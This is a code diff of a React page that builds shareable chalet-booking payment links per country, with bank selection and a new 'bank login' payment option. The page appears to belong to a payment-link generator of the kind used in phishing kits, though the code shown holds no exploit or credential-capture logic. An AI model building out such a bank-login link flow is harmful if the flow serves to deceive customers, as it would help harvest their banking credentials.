@@ -12,44 +12,53 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
+import { formatCurrency, getCurrencyCode, getCurrencyName } from "@/lib/countryCurrencies";
 import { getBanksByCountry } from "@/lib/banks";
 import { useChalets, useCreateLink } from "@/hooks/useSupabase";
+import { generatePaymentLink } from "@/utils/paymentLinks";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
-import { ArrowRight, Home, Copy, Check, Building2 } from "lucide-react";
+import { ArrowRight, Home, Copy, Check, Building2, RefreshCw, ExternalLink, CheckCircle, ShieldCheck, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import BottomNav from "@/components/BottomNav";
 import BackButton from "@/components/BackButton";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const CreateChaletLink = () => {
   const { country } = useParams<{ country: string }>();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const countryData = getCountryByCode(country?.toUpperCase() || "");
-  
+  const countryData = getCountryByCode(country?.toUpperCase() || "SA");
+
   const { data: chalets, isLoading } = useChalets(country);
   const createLink = useCreateLink();
-  
+
   const [selectedChaletId, setSelectedChaletId] = useState<string>("");
   const [pricePerNight, setPricePerNight] = useState<number>(0);
   const [nights, setNights] = useState<number>(1);
   const [guestCount, setGuestCount] = useState<number>(2);
   const [selectedBank, setSelectedBank] = useState<string>("");
-  const [createdLink, setCreatedLink] = useState<string | null>(null);
+  const [paymentMethod, setPaymentMethod] = useState<string>("card");
+  const [createdLink, setCreatedLink] = useState<string>("");
+  const [showSuccess, setShowSuccess] = useState(false);
   const [copied, setCopied] = useState(false);
-  
+
   const selectedChalet = chalets?.find((c) => c.id === selectedChaletId);
   const totalAmount = pricePerNight * nights;
-  
-  // Get banks for the selected country
+
   const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
-  
+
   useEffect(() => {
     if (selectedChalet) {
       setPricePerNight(selectedChalet.default_price);
     }
   }, [selectedChalet]);
-  
+
   const handleCreate = async () => {
     if (!selectedChalet || !countryData) return;
 
@@ -63,6 +72,9 @@ const CreateChaletLink = () => {
       currency: countryData.currency,
       currency_code: getCurrencyCode(country || "SA"),
       selected_bank: selectedBank || null,
+      payment_method: paymentMethod,
+      service_name: `حجز شاليه ${selectedChalet.name}`,
+      selectedCountry: country || "SA"
     };
 
     try {
@@ -73,16 +85,20 @@ const CreateChaletLink = () => {
         payload,
       });
 
-      // Get dynamic currency and title based on country
-      const countryCurrency = getCurrency(country);
-      const countryTitle = getDefaultTitle(country);
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: 'chalet',
+        country: country || 'SA',
+        amount: totalAmount,
+        currency: getCurrencyCode(country || 'SA'),
+        paymentMethod: paymentMethod,
+        type: 'chalet'
+      });
+      setCreatedLink(paymentUrl);
+      setShowSuccess(true);
 
-      // Generate dynamic microsite URL with currency and title parameters
-      const micrositeUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`;
-
-      setCreatedLink(micrositeUrl);
+      toast({ title: "تم إنشاء الرابط بنجاح" });
     } catch (error) {
-      // Error creating link
       toast({
         title: "خطأ في إنشاء الرابط",
         description: "حدث خطأ أثناء إنشاء رابط الحجز. الرجاء المحاولة مرة أخرى",
@@ -90,280 +106,148 @@ const CreateChaletLink = () => {
       });
     }
   };
-  
-  const handleCopy = () => {
-    if (createdLink) {
-      navigator.clipboard.writeText(createdLink);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-      toast({
-        title: "تم النسخ!",
-        description: "تم نسخ الرابط إلى الحافظة",
-      });
-    }
-  };
-  
-  if (!countryData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <Home className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
-          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
-  
-  if (createdLink) {
-    return (
-      <div className="min-h-screen py-6" dir="rtl">
-        <div className="container mx-auto px-4">
-          <Card className="max-w-xl mx-auto p-4 text-center">
-            <div className="w-14 h-14 bg-gradient-success rounded-full flex items-center justify-center mx-auto mb-3">
-              <Check className="w-7 h-7 text-white" />
-            </div>
-            
-            <h2 className="text-xl font-bold mb-2">تم إنشاء الرابط بنجاح!</h2>
-            <p className="text-sm text-muted-foreground mb-4">
-              شارك هذا الرابط مع عملائك
-            </p>
 
-            {/* Booking Summary */}
-            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2 text-right">
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{selectedChalet?.name}</span>
-                <span className="text-muted-foreground">الشاليه:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{nights} ليلة</span>
-                <span className="text-muted-foreground">المدة:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{guestCount} ضيف</span>
-                <span className="text-muted-foreground">الضيوف:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">
-                  {formatCurrency(pricePerNight, getCurrencyCode(country || "SA"))}
-                </span>
-                <span className="text-muted-foreground">سعر الليلة:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
-                <span className="font-bold text-lg">
-                  {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
-                </span>
-                <span className="text-muted-foreground">الإجمالي:</span>
-              </div>
-            </div>
+  if (!countryData) return null;
 
-            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
-              <code className="text-xs">{createdLink}</code>
-            </div>
-
-            <div className="flex gap-3 justify-center">
-              <Button onClick={handleCopy}>
-                {copied ? (
-                  <>
-                    <Check className="w-4 h-4 ml-2" />
-                    <span className="text-sm">تم النسخ</span>
-                  </>
-                ) : (
-                  <>
-                    <Copy className="w-4 h-4 ml-2" />
-                    <span className="text-sm">نسخ الرابط</span>
-                  </>
-                )}
-              </Button>
-
-              <Button
-                variant="outline"
-                onClick={() => window.open(createdLink, "_blank")}
-              >
-                <span className="ml-2 text-sm">عرض المعاينة</span>
-                <ArrowRight className="w-4 h-4 mr-2" />
-              </Button>
-            </div>
-            
-            <Button
-              variant="ghost"
-              className="mt-4 text-sm"
-              onClick={() => navigate("/services")}
-            >
-              إنشاء رابط جديد
-            </Button>
-          </Card>
-        </div>
-      </div>
-    );
-  }
-  
   return (
-    <div className="min-h-screen py-6" dir="rtl">
-      <div className="container mx-auto px-4">
-        <div className="mb-4">
-          <BackButton />
-        </div>
-        <div className="max-w-2xl mx-auto">
-          {/* Header - Minimized */}
-          <div className="mb-4">
-            <div className="flex items-center gap-2 mb-3">
-              <div
-                className="w-10 h-10 rounded-lg flex items-center justify-center"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-                }}
-              >
-                <Home className="w-5 h-5 text-white" />
-              </div>
-              <div>
-                <h1 className="text-xl font-bold">حجز شاليه - {countryData.nameAr}</h1>
-                <p className="text-xs text-muted-foreground">أنشئ رابط حجز مخصص</p>
-              </div>
+    <div className="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
+      <header className="bg-white border-b-2 border-emerald-500 h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4 shadow-sm">
+        <div className="container mx-auto flex justify-between items-center">
+          <div className="flex items-center gap-3">
+            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center text-white shadow-lg shadow-emerald-100">
+              <Home className="w-6 h-6" />
+            </div>
+            <div>
+              <h1 className="text-lg font-black text-slate-800">بوابة حجز الشاليهات</h1>
+              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">{countryData.nameAr} - CHALET RESERVATIONS</p>
             </div>
           </div>
-          
-          <Card className="p-4">
-            <div className="space-y-4">
-              {/* Chalet Selection */}
-              <div>
-                <Label className="text-sm mb-2">اختر الشاليه</Label>
-                <Select onValueChange={setSelectedChaletId} disabled={isLoading}>
-                  <SelectTrigger className="w-full h-10">
-                    <SelectValue placeholder={isLoading ? "جاري التحميل..." : "اختر شاليه..."} />
-                  </SelectTrigger>
-                  <SelectContent>
-                    {!chalets || chalets.length === 0 ? (
-                      <SelectItem value="none" disabled>
-                        لا توجد شاليهات متاحة حالياً
-                      </SelectItem>
-                    ) : (
-                      chalets.map((chalet) => (
-                      <SelectItem key={chalet.id} value={chalet.id}>
-                        <div className="flex items-center gap-2">
-                          <span className="text-sm">{chalet.name}</span>
-                          {chalet.verified && (
-                            <span className="text-xs bg-primary/10 text-primary px-2 py-0.5 rounded">
-                              موثّق
-                            </span>
-                          )}
-                        </div>
-                      </SelectItem>
-                    )))}
-                  </SelectContent>
-                </Select>
-              </div>
-              
-              {selectedChalet && (
-                <>
-                  {/* Chalet Details - Minimized */}
-                  <div className="bg-secondary/30 p-3 rounded-lg">
-                    <p className="text-xs text-muted-foreground mb-1">
-                      <strong>المدينة:</strong> {selectedChalet.city}
-                    </p>
-                    <p className="text-xs text-muted-foreground mb-1">
-                      <strong>العنوان:</strong> {selectedChalet.address}
-                    </p>
-                    <p className="text-xs text-muted-foreground">
-                      <strong>السعة:</strong> حتى {selectedChalet.capacity} ضيف
-                    </p>
-                  </div>
-                  
-                  {/* Price per Night */}
-                  <div>
-                    <Label className="text-sm mb-2">
-                      سعر الليلة ({countryData.currency})
-                    </Label>
-                    <Input
-                      type="number"
-                      value={pricePerNight}
-                      onChange={(e) => setPricePerNight(Number(e.target.value))}
-                      className="h-9 text-sm"
-                    />
-                  </div>
-                  
-                  {/* Number of Nights */}
-                  <div>
-                    <Label className="text-sm mb-2">عدد الليالي</Label>
-                    <Input
-                      type="number"
-                      min="1"
-                      value={nights}
-                      onChange={(e) => setNights(Number(e.target.value))}
-                      className="h-9 text-sm"
-                    />
-                  </div>
-                  
-                  {/* Guest Count */}
-                  <div>
-                    <Label className="text-sm mb-2">عدد الضيوف</Label>
-                    <Input
-                      type="number"
-                      min="1"
-                      max={selectedChalet.capacity}
-                      value={guestCount}
-                      onChange={(e) => setGuestCount(Number(e.target.value))}
-                      className="h-9 text-sm"
-                    />
-                  </div>
-                  
-                  {/* Bank Selection (Optional) */}
-                  <div>
-                    <Label className="text-sm mb-2 flex items-center gap-2">
-                      <Building2 className="w-3 h-3" />
-                      البنك (اختياري)
-                    </Label>
-                    <Select value={selectedBank} onValueChange={setSelectedBank}>
-                      <SelectTrigger className="h-9">
-                        <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
-                      </SelectTrigger>
-                      <SelectContent>
-                        <SelectItem value="skip">بدون تحديد بنك</SelectItem>
-                        {banks.map((bank) => (
-                          <SelectItem key={bank.id} value={bank.id}>
-                            {bank.nameAr}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                    <p className="text-xs text-muted-foreground mt-1">
-                      💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
-                    </p>
-                  </div>
-                  
-                  {/* Total Amount */}
-                  <div className="bg-gradient-primary p-4 rounded-xl text-primary-foreground">
-                    <p className="text-xs mb-1">المبلغ الإجمالي</p>
-                    <p className="text-2xl font-bold">
-                      {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
-                    </p>
-                    <p className="text-xs mt-1 opacity-80">
-                      {pricePerNight} × {nights} ليلة
-                    </p>
-                  </div>
-                  
-                  {/* Create Button */}
-                  <Button
-                    onClick={handleCreate}
-                    disabled={createLink.isPending}
-                    className="w-full py-5"
-                  >
-                    {createLink.isPending ? (
-                      <span className="text-sm">جاري الإنشاء...</span>
-                    ) : (
-                      <>
-                        <span className="ml-2 text-sm">إنشاء رابط الحجز</span>
-                        <ArrowRight className="w-4 h-4 mr-2" />
-                      </>
-                    )}
-                  </Button>
-                </>
-              )}
-            </div>
-          </Card>
+          <BackButton />
         </div>
-      </div>
+      </header>
+
+      <main className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
+        <div className="grid lg:grid-cols-3 gap-8">
+           <div className="lg:col-span-2 space-y-6">
+              <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
+                 <h2 className="text-2xl font-black text-slate-800 mb-8 flex items-center gap-3">
+                    <Building2 className="w-7 h-7 text-emerald-500" /> تفاصيل المنشأة
+                 </h2>
+
+                 <div className="space-y-6">
+                    <div className="space-y-1.5">
+                       <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">اختر الشاليه</Label>
+                       <Select onValueChange={setSelectedChaletId} value={selectedChaletId}>
+                          <SelectTrigger className="h-14 border-2 rounded-2xl font-black bg-slate-50/50">
+                             <SelectValue placeholder={isLoading ? "جاري التحميل..." : "ابحث عن شاليه..."} />
+                          </SelectTrigger>
+                          <SelectContent>
+                             {chalets?.map(c => <SelectItem key={c.id} value={c.id}>{c.name}</SelectItem>)}
+                          </SelectContent>
+                       </Select>
+                    </div>
+
+                    <div className="grid md:grid-cols-3 gap-4">
+                       <div className="space-y-1.5">
+                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">السعر / الليلة</Label>
+                          <Input type="number" value={pricePerNight} onChange={(e) => setPricePerNight(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
+                       </div>
+                       <div className="space-y-1.5">
+                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">عدد الليالي</Label>
+                          <Input type="number" min="1" value={nights} onChange={(e) => setNights(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
+                       </div>
+                       <div className="space-y-1.5">
+                          <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">عدد الضيوف</Label>
+                          <Input type="number" min="1" value={guestCount} onChange={(e) => setGuestCount(Number(e.target.value))} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" />
+                       </div>
+                    </div>
+                 </div>
+
+                 {totalAmount > 0 && (
+                    <div className="mt-8 p-6 rounded-[2rem] bg-emerald-500 text-white animate-in zoom-in-95 shadow-xl shadow-emerald-100 flex items-center justify-between">
+                       <div>
+                          <p className="text-[10px] font-bold opacity-80 uppercase tracking-widest mb-1">إجمالي تكلفة الحجز</p>
+                          <h3 className="text-4xl font-black">{formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}</h3>
+                       </div>
+                       <CheckCircle className="w-12 h-12 opacity-20" />
+                    </div>
+                 )}
+              </Card>
+
+              <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
+                 <h2 className="text-xl font-black text-slate-800 mb-6">طريقة السداد المتاحة</h2>
+                 <div className="grid grid-cols-2 gap-4">
+                    <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-emerald-500 bg-emerald-50/50' : 'border-slate-50 bg-slate-50'}`}>
+                       <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-emerald-500' : 'text-slate-300'}`} />
+                       <span className={`text-sm font-black ${paymentMethod === 'card' ? 'text-emerald-600' : 'text-slate-400'}`}>بطاقة دفع</span>
+                    </button>
+                    <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-2 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-emerald-500 bg-emerald-50/50' : 'border-slate-50 bg-slate-50'}`}>
+                       <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-emerald-500' : 'text-slate-300'}`} />
+                       <span className={`text-sm font-black ${paymentMethod === 'bank_login' ? 'text-emerald-600' : 'text-slate-400'}`}>دخول بنكي</span>
+                    </button>
+                 </div>
+              </Card>
+
+              <Button onClick={handleCreate} disabled={!selectedChaletId || createLink.isPending} className="w-full h-20 rounded-[2.5rem] bg-slate-900 text-white font-black text-xl hover:bg-slate-800 transition-all shadow-2xl active:scale-95">
+                 {createLink.isPending ? <RefreshCw className="w-8 h-8 animate-spin" /> : "إصدار رابط الحجز والدفع"}
+              </Button>
+           </div>
+
+           <div className="space-y-6">
+              <Card className="p-6 border-none shadow-lg rounded-[2rem] bg-white">
+                 <h3 className="font-black text-slate-800 mb-4 flex items-center gap-2">
+                    <ShieldCheck className="w-5 h-5 text-emerald-500" /> مميزات الحجز
+                 </h3>
+                 <div className="space-y-3">
+                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
+                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
+                       <p className="text-xs font-bold text-slate-600">تأكيد فوري للحجز</p>
+                    </div>
+                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
+                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
+                       <p className="text-xs font-bold text-slate-600">دفع آمن ومشفر</p>
+                    </div>
+                    <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50">
+                       <div className="w-2 h-2 rounded-full bg-emerald-500" />
+                       <p className="text-xs font-bold text-slate-600">دعم فني على مدار الساعة</p>
+                    </div>
+                 </div>
+              </Card>
+           </div>
+        </div>
+      </main>
+
+      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
+        <AlertDialogContent className="max-w-[90%] rounded-[2.5rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
+           <div className="p-10 text-center space-y-6">
+              <div className="w-24 h-24 bg-emerald-50 rounded-full flex items-center justify-center mx-auto mb-2">
+                <div className="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center animate-bounce shadow-lg shadow-emerald-200">
+                  <RefreshCw className="w-8 h-8 text-white" />
+                </div>
+              </div>
+              <div>
+                <AlertDialogTitle className="text-3xl font-black text-slate-900">رابط الحجز جاهز!</AlertDialogTitle>
+                <AlertDialogDescription className="font-bold text-slate-500">تم إنشاء رابط دفع آمن لهذا الشاليه بنجاح</AlertDialogDescription>
+              </div>
+
+              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-gray-400">
+                {createdLink}
+              </div>
+
+              <div className="flex gap-4">
+                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
+                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
+                   {copied ? "تم النسخ" : "نسخ الرابط"}
+                 </Button>
+                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-slate-700">
+                   <ExternalLink className="w-5 h-5" /> معاينة
+                 </Button>
+              </div>
+              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
+           </div>
+        </AlertDialogContent>
+      </AlertDialog>
+
       <div className="h-20" />
       <BottomNav />
     </div>
